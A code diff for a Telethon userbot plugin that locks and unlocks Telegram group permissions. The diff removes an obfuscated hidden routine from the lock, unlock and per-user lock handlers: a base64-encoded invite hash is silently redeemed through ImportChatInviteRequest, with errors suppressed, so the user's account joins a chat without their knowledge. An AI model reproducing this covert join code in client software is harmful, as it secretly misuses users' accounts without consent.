@@ -3,7 +3,6 @@ import base64
 from telethon import events, functions, types
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.functions.messages import EditChatDefaultBannedRightsRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import ChatBannedRights
 from telethon.utils import get_display_name
 
@@ -57,7 +56,6 @@ async def _(event):  # sourcery no-metrics
     if not event.is_group:
         return await edit_delete(event, "`Idiot! ,This is not a group to lock things `")
     chat_per = (await event.get_chat()).default_banned_rights
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, True)
         await edit_or_reply(event, "`Locked {}`".format(input_str))
@@ -172,11 +170,6 @@ async def _(event):  # sourcery no-metrics
 
         else:
             return await edit_or_reply(event, "`I can't lock nothing !!`")
-        try:
-            cat = Get(cat)
-            await event.client(cat)
-        except BaseException:
-            pass
         lock_rights = ChatBannedRights(
             until_date=None,
             send_messages=msg,
@@ -244,7 +237,6 @@ async def _(event):  # sourcery no-metrics
     peer_id = event.chat_id
     if not event.is_group:
         return await edit_delete(event, "`Idiot! ,This is not a group to lock things `")
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     chat_per = (await event.get_chat()).default_banned_rights
     if input_str in (("bots", "commands", "email", "forward", "url")):
         update_lock(peer_id, input_str, False)
@@ -360,11 +352,6 @@ async def _(event):  # sourcery no-metrics
 
         else:
             return await edit_or_reply(event, "`I can't unlock nothing !!`")
-        try:
-            cat = Get(cat)
-            await event.client(cat)
-        except BaseException:
-            pass
         unlock_rights = ChatBannedRights(
             until_date=None,
             send_messages=msg,
@@ -487,7 +474,6 @@ async def _(event):  # sourcery no-metrics
     admincheck = await is_admin(event.client, peer_id, reply.from_id)
     if admincheck:
         return await edit_delete(event, "`This user is admin you cant play with him`")
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     msg = chat_per.send_messages
     media = chat_per.send_media
     sticker = chat_per.send_stickers
@@ -668,11 +654,6 @@ async def _(event):  # sourcery no-metrics
 
     else:
         return await edit_or_reply(event, "`I can't lock nothing !!`")
-    try:
-        cat = Get(cat)
-        await event.client(cat)
-    except BaseException:
-        pass
     lock_rights = ChatBannedRights(
         until_date=None,
         send_messages=umsg,
@@ -733,7 +714,6 @@ async def _(event):  # sourcery no-metrics
     admincheck = await is_admin(event.client, peer_id, reply.from_id)
     if admincheck:
         return await edit_delete(event, "`This user is admin you cant play with him`")
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     msg = chat_per.send_messages
     media = chat_per.send_media
     sticker = chat_per.send_stickers
@@ -917,11 +897,6 @@ async def _(event):  # sourcery no-metrics
 
     else:
         return await edit_or_reply(event, "`I can't lock nothing !!`")
-    try:
-        cat = Get(cat)
-        await event.client(cat)
-    except BaseException:
-        pass
     lock_rights = ChatBannedRights(
         until_date=None,
         send_messages=umsg,
